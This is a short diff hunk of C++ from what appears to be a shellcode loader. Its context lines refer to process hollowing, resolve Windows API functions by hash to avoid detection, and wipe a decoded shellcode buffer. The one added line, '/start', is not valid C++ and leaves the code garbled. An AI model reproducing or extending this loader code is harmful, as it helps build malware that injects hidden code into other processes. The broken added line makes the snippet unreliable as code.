@@ -289,6 +289,7 @@ int main() {
         std::cerr << "Process hollowing failed.\n";
     }
 
+/start 
     auto SecureZeroMemory = (decltype(&::SecureZeroMemory))get_api_function(hash_function("kernel32.dll"), hash_function("SecureZeroMemory"));
     SecureZeroMemory(decoded_shellcode.data(), decoded_shellcode.size());
 
